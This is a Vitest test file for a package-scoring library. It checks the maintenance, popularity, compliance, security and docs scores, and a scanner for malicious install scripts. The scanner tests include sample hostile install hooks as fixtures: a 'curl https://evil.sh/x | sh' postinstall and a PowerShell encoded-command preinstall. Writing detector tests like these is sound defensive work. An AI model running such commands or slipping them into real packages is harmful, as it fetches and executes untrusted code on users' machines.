import { describe, expect, it } from "vitest";
import {
  computeScore,
  percentile,
  scanInstallScripts,
  scoreCompliance,
  scoreDocs,
  scoreMaintenance,
  scorePopularity,
  scoreSecurity,
} from "@/lib/scoring";

const NOW = new Date("2026-08-25T00:00:00Z");
const daysAgo = (n: number) => new Date(NOW.getTime() - n * 86_400_000);

describe("scoreMaintenance (0-30)", () => {
  it("30 天内 commit 满分", () => {
    expect(scoreMaintenance(daysAgo(0), NOW)).toBe(30);
    expect(scoreMaintenance(daysAgo(29), NOW)).toBe(30);
  });
  it("按 180 天半衰期衰减", () => {
    expect(scoreMaintenance(daysAgo(210), NOW)).toBeCloseTo(15, 0);
    expect(scoreMaintenance(daysAgo(390), NOW)).toBeCloseTo(7.5, 0);
  });
  it("无 commit 记录得 0 分", () => {
    expect(scoreMaintenance(null, NOW)).toBe(0);
  });
});

describe("scorePopularity (0-25)", () => {
  it("只有 star 百分位时按满权重折算", () => {
    expect(scorePopularity(1, null)).toBe(25);
    expect(scorePopularity(0.5, null)).toBe(12.5);
    expect(scorePopularity(0, null)).toBe(0);
  });
  it("有下载数据时 60/40 加权", () => {
    expect(scorePopularity(1, 0)).toBe(15);
    expect(scorePopularity(0, 1)).toBe(10);
    expect(scorePopularity(1, 1)).toBe(25);
  });
  it("越界输入被钳制", () => {
    expect(scorePopularity(1.5, null)).toBe(25);
    expect(scorePopularity(-1, null)).toBe(0);
  });
});

describe("scoreCompliance (0-20)", () => {
  it("通过校验 20 / 有 manifest 未通过 8 / 无 manifest 0", () => {
    expect(scoreCompliance(true, true)).toBe(20);
    expect(scoreCompliance(false, true)).toBe(8);
    expect(scoreCompliance(false, false)).toBe(0);
  });
});

describe("scoreSecurity (0-15)", () => {
  it("license 6 + 无可疑脚本 5 + owner 验证 4 = 15", () => {
    expect(
      scoreSecurity({ hasLicense: true, suspiciousInstallScript: false, verifiedOwner: true }),
    ).toBe(15);
  });
  it("可疑 install script 扣 5 分", () => {
    expect(
      scoreSecurity({ hasLicense: true, suspiciousInstallScript: true, verifiedOwner: false }),
    ).toBe(6);
  });
});

describe("scoreDocs (0-10)", () => {
  it("长 README + 结构 + 示例满分", () => {
    expect(
      scoreDocs({ readmeLength: 2000, readmeHasCodeExample: true, readmeHasStructure: true }),
    ).toBe(10);
  });
  it("无 README 0 分", () => {
    expect(
      scoreDocs({ readmeLength: 0, readmeHasCodeExample: false, readmeHasStructure: false }),
    ).toBe(0);
  });
});

describe("computeScore 合成", () => {
  it("满分场景 = 100", () => {
    const { total, breakdown } = computeScore({
      lastCommitAt: daysAgo(1),
      starsPercentile: 1,
      downloadsPercentile: null,
      specValid: true,
      hasManifest: true,
      hasLicense: true,
      suspiciousInstallScript: false,
      verifiedOwner: true,
      readmeLength: 5000,
      readmeHasCodeExample: true,
      readmeHasStructure: true,
      now: NOW,
    });
    expect(total).toBe(100);
    expect(breakdown).toEqual({
      maintenance: 30,
      popularity: 25,
      compliance: 20,
      security: 15,
      docs: 10,
    });
  });
  it("空仓库场景低分", () => {
    const { total } = computeScore({
      lastCommitAt: null,
      starsPercentile: 0,
      downloadsPercentile: null,
      specValid: false,
      hasManifest: false,
      hasLicense: false,
      suspiciousInstallScript: false,
      verifiedOwner: false,
      readmeLength: 0,
      readmeHasCodeExample: false,
      readmeHasStructure: false,
      now: NOW,
    });
    expect(total).toBe(5); // 仅「无可疑脚本」5 分
  });
});

describe("scanInstallScripts 恶意模式扫描", () => {
  it("检出 curl | sh", () => {
    expect(
      scanInstallScripts({ scripts: { postinstall: "curl https://evil.sh/x | sh" } }),
    ).toBe(true);
  });
  it("检出 powershell -enc", () => {
    expect(
      scanInstallScripts({ scripts: { preinstall: "powershell -EncodedCommand SQBFAFgA" } }),
    ).toBe(true);
  });
  it("正常构建脚本不误报", () => {
    expect(
      scanInstallScripts({ scripts: { postinstall: "node ./scripts/setup.js", build: "tsc" } }),
    ).toBe(false);
    expect(scanInstallScripts(null)).toBe(false);
    expect(scanInstallScripts({})).toBe(false);
  });
});

describe("percentile", () => {
  it("生态内百分位", () => {
    const sorted = [1, 5, 10, 50, 100];
    expect(percentile(100, sorted)).toBe(1);
    expect(percentile(10, sorted)).toBe(0.6);
    expect(percentile(0, sorted)).toBe(0);
    expect(percentile(3, [])).toBe(0);
  });
});
